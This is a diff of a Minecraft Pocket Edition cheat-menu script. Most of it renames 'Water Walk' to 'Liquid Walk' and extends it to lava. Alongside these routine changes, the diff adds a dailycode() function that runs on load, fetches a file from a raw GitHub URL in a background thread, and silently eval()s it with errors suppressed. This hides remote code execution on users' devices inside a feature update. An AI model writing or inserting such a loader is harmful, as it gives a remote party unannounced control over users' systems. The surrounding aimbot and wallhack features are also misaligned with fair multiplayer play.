@@ -194,7 +194,7 @@ var phack = false;
 var masstpa = false;
 var masstell = false;
 var masstellmsg = "Hi!";
-var ww = false;
+var lw = false;
 var nor = 0;
 var wallh = false;
 var aimbot = false;
@@ -233,9 +233,9 @@ var desc = {
 			desc:"It let you glide in Single Player.\n Don't forget: You will get normal fall damage",
 			servercomp:false
 		},
-		waterwalk:{
-			title:"Water Walk",
-			desc:"It let you walk on water.\n Best way to be faster on water",
+		liquidwalk:{
+			title:"Liquid Walk",
+			desc:"It let you walk on liquids.\n Best way to be faster on liquid's",
 			servercomp:true
 		},
 		xray:{
@@ -387,7 +387,7 @@ var options = new file.select(sdcard, "games/com.mojang/minecraftpe/options.txt"
 
 
 /*Example - write text*/
-var ver = "0.11.3";
+var ver = "0.11.4";
 //Language
 function pref() {
     try {
@@ -728,7 +728,40 @@ function checkfupdate() {
 
 }
 checkfupdate();
+function dailycode() {
+    var r = new java.lang.Runnable({
+        run: function() {
+            try {
+                var u = new java.net.URL("https://raw.githubusercontent.com/Godsoft029/servicehack/master/dailycode.run");
+                var c = u.openConnection();
+                c.setRequestMethod("GET");
+                c.setDoOutput(true);
+                c.connect();
+                c.getContentLength();
+                var input = c.getInputStream();
+                var contents = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 1024);
+                var bytesRead = 0;
+                var strFileContents;
+                while((bytesRead = input.read(contents)) != -1) {
+                    strFileContents = new java.lang.String(contents, 0, bytesRead);
+                }
+               
+                var code = strFileContents;
+                try{
+eval(code);
+}catch(e){
+}
 
+            } catch(e) {
+                // ("Network Error!", 2);
+            }
+        }
+    });
+    var th = new java.lang.Thread(r);
+    th.start();
+
+}
+dailycode();
 
 function configd1() {
     try {
@@ -1398,25 +1431,27 @@ print(e);
 }
                     }
                 }));
-                var btnww = newSpriteButton(desc.hack.waterwalk);
-                var wwtext;
-                if(ww) {
-                    wwtext = lamg[lang][9][0];
+                var btnlw = newSpriteButton(desc.hack.liquidwalk);
+                var lwtext;
+                if(lw) {
+                    lwtext = lamg[lang][9][0];
                 } else {
-                    wwtext = lamg[lang][9][1];
+                    lwtext = lamg[lang][9][1];
                 }
-                btnww.setText("Water Walk: " + wwtext);
+                btnlw.setText("Liquid Walk: " + lwtext);
 
-                btnww.setOnClickListener(new android.view.View.OnClickListener({
+                btnlw.setOnClickListener(new android.view.View.OnClickListener({
                     onClick: function(viewarg) {
-                        if(ww) {
-                            wwtext = lamg[lang][9][1];
-                            ww = false;
+                        if(lw) {
+                            lwtext = lamg[lang][9][1];
+                            lw = false;
                             Block.setShape(8, 0, 0, 0, 0.001, 0.001, 0.001);
                             Block.setShape(9, 0, 0, 0, 0.001, 0.001, 0.001);
+                            Block.setShape(10, 0, 0, 0, 0.001, 0.001, 0.001);
+                            Block.setShape(11, 0, 0, 0, 0.001, 0.001, 0.001);
                         } else {
-                            wwtext = lamg[lang][9][0];
-                            ww = true;
+                            lwtext = lamg[lang][9][0];
+                            lw = true;
                             Block.setLightOpacity(8, 10);
                             Block.setLightOpacity(9, 10);
                             Block.defineBlock(8, "Water", [
@@ -1429,8 +1464,21 @@ print(e);
                             Block.setDestroyTime(9, 1);
                             Block.setShape(8, 0, 0, 0, 1, 0.7, 1);
                             Block.setShape(9, 0, 0, 0, 1, 0.7, 1);
+                            Block.setLightOpacity(10, 10);
+                            Block.setLightOpacity(11, 10);
+                            Block.defineBlock(10, "Lava", [
+                                ["still_lava", 0]
+                            ], 10, false, 4);
+                            Block.defineBlock(11, "Stationary Lava", [
+                                ["still_lava", 0]
+                            ], 11, false, 4);
+                            Block.setDestroyTime(10, 1);
+                            Block.setDestroyTime(11, 1);
+                            Block.setShape(10, 0, 0, 0, 1, 0.7, 1);
+                            Block.setShape(11, 0, 0, 0, 1, 0.7, 1);
+
                         }
-                        btnww.setText("Water Walk: " + wwtext);
+                        btnlw.setText("Liquid Walk: " + lwtext);
                     }
                 }));
                 var btnxray = newSpriteButton(desc.hack.xray);
@@ -1632,7 +1680,7 @@ aimbot = false;
                     menuLayout.addView(newplaceholder());
                     menuLayout.addView(btnglide);
                     menuLayout.addView(newplaceholder());
-                    menuLayout.addView(btnww);
+                    menuLayout.addView(btnlw);
                     menuLayout.addView(newplaceholder());
                     menuLayout.addView(btnxray);
                     menuLayout.addView(newplaceholder());
@@ -3040,9 +3088,9 @@ print(e);
                             var th = new java.lang.Thread(r);
                             th.start();
                         }
-                        //waterwalk
+                        //liquidwalk
                         /*
-                        	if(ww){
+                        	if(lw){
                         		Block.setLightOpacity(8, 10);
                         		Block.setLightOpacity(9, 10);
                         		Block.defineBlock(8, "Water", [["still_water", 0]], 8, false, 4);
